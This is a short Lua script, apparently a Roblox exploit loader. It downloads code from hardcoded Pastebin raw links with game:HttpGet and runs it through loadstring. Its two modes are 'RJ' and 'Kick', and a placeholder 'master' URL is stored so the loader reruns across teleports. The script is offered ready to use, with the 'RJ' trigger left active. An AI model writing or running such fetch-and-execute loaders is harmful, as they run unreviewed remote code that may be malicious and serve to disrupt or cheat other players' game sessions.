local function executeIdiotScript(mode)
    -- Configured Pastebin endpoints
    local rjScriptURL = "https://pastebin.com/raw/rTui1M6R"
    local kickScriptURL = "https://pastebin.com/raw/78Y2smJ5"
    
    -- Self-referencing link to run this master check on loop during teleports
    local masterFunctionURL = "https://pastebin.com/raw/YOUR_MASTER_SCRIPT_PASTEBIN_HERE"

    -- Pass the master executor link over to the game environment attributes
    game:SetAttribute("MasterExecutorURL", masterFunctionURL)

    if mode == "RJ" then
        local success, result = pcall(function()
            return loadstring(game:HttpGet(rjScriptURL))()
        end)
        if not success then warn("Failed to execute RJ script: " .. tostring(result)) end
        
    elseif mode == "Kick" then
        local success, result = pcall(function()
            return loadstring(game:HttpGet(kickScriptURL))()
        end)
        if not success then warn("Failed to execute Kick script: " .. tostring(result)) end
        
    else
        warn("Invalid mode parameter. Please input 'RJ' or 'Kick'.")
    end
end

-- ==========================================================
-- EXECUTION TRIGGERS (Uncomment the one you want to run)
-- ==========================================================
executeIdiotScript("RJ")
-- executeIdiotScript("Kick")
